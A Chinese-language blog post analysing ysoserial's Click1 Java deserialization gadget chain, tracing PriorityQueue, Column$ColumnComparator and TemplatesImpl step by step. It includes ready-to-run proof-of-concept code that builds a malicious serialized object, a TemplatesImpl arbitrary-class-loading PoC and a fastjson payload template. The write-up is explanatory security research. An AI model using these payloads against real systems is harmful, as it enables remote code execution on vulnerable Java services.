> 原文链接: https://www.anquanke.com//post/id/240706 


# 新的反序列化链——Click1


                                阅读量   
                                **193187**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01193de13f8453109a.png)](https://p5.ssl.qhimg.com/t01193de13f8453109a.png)



前段时间ysoserial又更新了一个链Click1，网上好像一直没人分析，最近在学习java，就稍微分析下。

## 一、 利用代码

Click1依赖click-nodeps-2.3.0.jar，javax.servlet-api-3.1.0.jar<br>
click-nodeps应该是个冷门项目，搜不到太多信息，所以此链也就看看就好，增加一点关于java反序列化的知识。<br>[https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Click1.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Click1.java)<br>
不想重新编译ysoserial的，或者只想要POC的，可以用我重构的代码如下

```
package test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.click.control.Column;
import org.apache.click.control.Table;
import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Click1 `{`
    public static void main(String[] args) throws Exception `{`
        FileInputStream inputFromFile = new FileInputStream("C:\\Users\\Administrator.K\\workspace\\test\\bin\\test\\TemplatesImplcmd.class");
        byte[] bs = new byte[inputFromFile.available()];
        inputFromFile.read(bs);
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]`{`bs`}`);
        setFieldValue(obj, "_name", "TemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = column.getComparator();
        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        column.setName("outputProperties");
        setFieldValue(queue, "queue", new Object[]`{`obj, obj`}`);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("1.ser"));
        objectOutputStream.writeObject(queue);
        objectOutputStream.close();
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("1.ser"));
        objectInputStream.readObject();
    `}`
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception `{`
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    `}`

`}`
```

[![](https://p2.ssl.qhimg.com/t01ac770abfb58016ef.png)](https://p2.ssl.qhimg.com/t01ac770abfb58016ef.png)



## 二、 TemplatesImpl

Click1链和CommonsBeanutils1链息息相关，更确切来说，这就是CommonsBeanutils1链在其他jar包的用法。想要跟这个链，就必须了解CommonsBeanutils1链的知识，比如TemplatesImpl。<br>
Click1链和CommonsBeanutils1链都是无法直接去调Runtime.getRuntime().exec()的，只能使用TemplatesImpl加载任意类。<br>
如何做到的呢？先看com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()

```
public synchronized Properties getOutputProperties() `{`
        try `{`
            return newTransformer().getOutputProperties();
        `}`
        catch (TransformerConfigurationException e) `{`
            return null;
        `}`
    `}`
```

调newTransformer()

```
public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    `{`
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) `{`
            transformer.setURIResolver(_uriResolver);
        `}`

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) `{`
            transformer.setSecureProcessing(true);
        `}`
        return transformer;
    `}`
```

调getTransletInstance()

```
private Translet getTransletInstance()
        throws TransformerConfigurationException `{`
        try `{`
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

需要_name不为null且_class为null，这就是setFieldValue(obj, “_name”, “XXX”);的意义。<br>
调defineTransletClasses()

```
private void defineTransletClasses()
        throws TransformerConfigurationException `{`

        if (_bytecodes == null) `{`
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        `}`

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() `{`
                public Object run() `{`
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                `}`
            `}`);

        try `{`
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount &gt; 1) `{`
                _auxClasses = new HashMap&lt;&gt;();
            `}`

            for (int i = 0; i &lt; classCount; i++) `{`
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) `{`
                    _transletIndex = i;
                `}`
```

注意这里_tfactory.getExternalExtensionsMap()，也就是为什么将_tfactory设置成new TransformerFactoryImpl()的原因。

但我们可以发现在fastjson的payload中并没有这样设置。

```
`{`"a":`{`"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":[""xxxxxxxxxxxxxxxxxxxxxxxx""],"_name": "aaa","_tfactory":`{``}`,"_outputProperties":`{``}``}``}`
```

实际情况注释掉这行代码生成的反序列化payload也一样能用，但直接调用getOutputProperties却不能缺失这行，所以最好还是加上。

而我们设置的_bytecodes在这儿被defineClass加载进去，此处最终会调用原生defineClass加载字节码，然后赋值给_class[i]。而在getTransletInstance()执行defineTransletClasses()之后

```
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

由于_transletIndex = i，至此我们加载进去的TemplatesImplcmd.class被实例化。

总结，只要我们事先用反射设置好_bytecodes/_name/_tfactory这三个属性，再调用TemplatesImpl.getOutputProperties()，即可执行任意类。POC如下

```
package test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.*;
import java.lang.reflect.Field;

public class Test `{`
    public static void main(String[] args) throws Exception `{`
        FileInputStream inputFromFile = new FileInputStream("C:\\Users\\Administrator.K\\workspace\\test\\bin\\test\\TemplatesImplcmd.class");
        byte[] bs = new byte[inputFromFile.available()];
        inputFromFile.read(bs);
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]`{`bs`}`);
        setFieldValue(obj, "_name", "TemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.getOutputProperties();
    `}`
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception `{`
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    `}`

`}`
```

这也是正是fastjson payload的原理。



## 三、 PriorityQueue

PriorityQueue是一个优先队列，在反序列化的过程中，会调用Comparator对元素进行比较，Click1和CommonsBeanutils1存在反序列化漏洞的原因就是因为它们都重写了compare()方法。<br>
我们还是从后往前去跟，先看PriorityQueue.readObject()

```
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException `{`
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i &lt; size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
```

调用heapify()

```
private void heapify() `{`
        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
            siftDown(i, (E) queue[i]);
    `}`
```

调用siftDown()

```
private void siftDown(int k, E x) `{`
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    `}`
```

comparator在new的时候输入进去，当然不为空，调用siftDownUsingComparator()

```
private void siftDownUsingComparator(int k, E x) `{`
        int half = size &gt;&gt;&gt; 1;
        while (k &lt; half) `{`
            int child = (k &lt;&lt; 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right &lt; size &amp;&amp;
                comparator.compare((E) c, (E) queue[right]) &gt; 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) &lt;= 0)
                break;
            queue[k] = c;
            k = child;
        `}`
        queue[k] = x;
    `}`
```

调用comparator.compare()，因为Comparator comparator = column.getComparator();，所以实际调的是org.apache.click.control.Column$ColumnComparator.compare()

```
public int compare(Object row1, Object row2) `{`

            this.ascendingSort = column.getTable().isSortedAscending() ? 1 : -1;

            Object value1 = column.getProperty(row1);
            Object value2 = column.getProperty(row2);
```

注意这儿getTable()需要this.table，因此需要column.setTable(new Table());<br>
调用getProperty()

```
public Object getProperty(Object row) `{`
        return getProperty(getName(), row);
    `}`
```

getName()根据column.setName(“outputProperties”);也就是outputProperties

```
public String getName() `{`
        return name;
    `}`
```

继续跟getProperty()

```
public Object getProperty(String name, Object row) `{`
        if (row instanceof Map) `{`
        xxxxxxxxxxx
        `}` else `{`
            if (methodCache == null) `{`
                methodCache = new HashMap&lt;Object, Object&gt;();
            `}`

            return PropertyUtils.getValue(row, name, methodCache);
        `}`
    `}`
```

row不是map，因此调用PropertyUtils.getValue()

```
public static Object getValue(Object source, String name, Map cache) `{`
        String basePart = name;
        String remainingPart = null;

        if (source instanceof Map) `{`
            return ((Map) source).get(name);
        `}`

        int baseIndex = name.indexOf(".");
        if (baseIndex != -1) `{`
            basePart = name.substring(0, baseIndex);
            remainingPart = name.substring(baseIndex + 1);
        `}`

        Object value = getObjectPropertyValue(source, basePart, cache);
```

source不是Map，因此调用getObjectPropertyValue()

```
private static Object getObjectPropertyValue(Object source, String name, Map cache) `{`
        PropertyUtils.CacheKey methodNameKey = new PropertyUtils.CacheKey(source, name);

        Method method = null;
        try `{`
            method = (Method) cache.get(methodNameKey);

            if (method == null) `{`

                method = source.getClass().getMethod(ClickUtils.toGetterName(name));
                cache.put(methodNameKey, method);
            `}`

            return method.invoke(source);
```

可以明显看出来以反射的方式，最终执行了ClickUtils.toGetterName(name)方法，而toGetterName()也就是给name加个get而已，而name前面说过就是 outputProperties，而source 就是TemplatesImpl，也就是最终执行了TemplatesImpl. getOutputProperties()。

source为什么TemplatesImpl可以回头看看<br>
getObjectPropertyValue(source)<br>
getValue(source)<br>
getProperty(row)<br>
compare(row1)<br>
siftDownUsingComparator()

```
private void siftDownUsingComparator(int k, E x) `{`
        int half = size &gt;&gt;&gt; 1;
        while (k &lt; half) `{`
            int child = (k &lt;&lt; 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right &lt; size &amp;&amp;
                comparator.compare((E) c, (E) queue[right]) &gt; 0)
                c = queue[child = right];
```

row1为c也就是queue[child]，正是我们反射进去的TemplatesImpl。<br>
setFieldValue(queue, “queue”, new Object[]`{`obj, obj`}`);



## 四、 总结

最后还剩三行代码需要解释

```
final Column column = new Column("lowestSetBit");
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
```

这里其实在用调getlowestSetBit方法去比较并排序两个new BigInteger(“1”)。排序之前name被设置为lowestSetBit，排序之后利用反射重置name为outputProperties，两个new BigInteger(“1”)也被重置为TemplatesImpl。序列化之后再用readObject触发，是用非常巧妙的方式绕过了可以排序和比较的类型(Comparabl接口)限制。<br>
代码很简单不再分析只给出大致的调用链。

Column.Column() //设置name为 lowestSetBit<br>
PriorityQueue.add() //第一次新增<br>
PriorityQueue.offer()<br>
PriorityQueue.grow()<br>
PriorityQueue.add() //第二次新增<br>
PriorityQueue.offer()<br>
PriorityQueue.siftUp()<br>
PriorityQueue.siftUpUsingComparator()<br>
Column$Comparator.compare()<br>
Column.getProperty()<br>
Column.getName() //取出lowestSetBit<br>
Column.getProperty()<br>
PropertyUtils.getValue()<br>
PropertyUtils.getObjectPropertyValue()<br>
BigInteger.getLowestSetBit()

而反序列化的调用链为

PriorityQueue.readObject()<br>
PriorityQueue.heapify()<br>
PriorityQueue.siftDown()<br>
PriorityQueue.siftDownUsingComparator()<br>
Column$ColumnComparator.compare()<br>
Column.getProperty()<br>
Column.getName()<br>
Column.getProperty()<br>
PropertyUtils.getValue()<br>
PropertyUtils.getObjectPropertyValue()<br>
TemplatesImpl.getOutputProperties()<br>
TemplatesImpl.newTransformer()<br>
TemplatesImpl.getTransletInstance()<br>
TemplatesImpl.defineTransletClasses()<br>
TemplatesImpl$TransletClassLoader.defineClass()

Click1链和CommonsBeanutils1链几乎一模一样，虽然不如CommonsBeanutils1通用，但是认真分析下来还是能学到不少东西。
